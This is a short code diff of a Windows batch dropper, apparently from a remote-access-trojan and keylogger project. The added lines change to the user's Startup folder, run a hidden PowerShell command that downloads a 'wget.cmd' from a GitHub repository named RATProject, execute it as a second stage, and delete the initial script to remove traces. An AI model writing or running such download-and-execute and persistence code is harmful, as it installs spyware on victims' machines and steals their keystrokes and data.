@@ -9,9 +9,11 @@ set STARTUP="C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Pr
 cd %STARTUP% 
 
 @REM run stage2
-powershell -c "Invoke-WebRequest -Uri 'speedtest.ftp.otenet.gr/files/test100k.db' -OutFile 'payload'"
+powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://github.com/huynh044/RATProject/blob/main/key_logger/important_file/wget.cmd' -OutFile 'wget.cmd'"
+powershell ".\wget.cmd"
 
 
 @REM back to last path
 cd %INITIAL%
+del inital.cmd
 
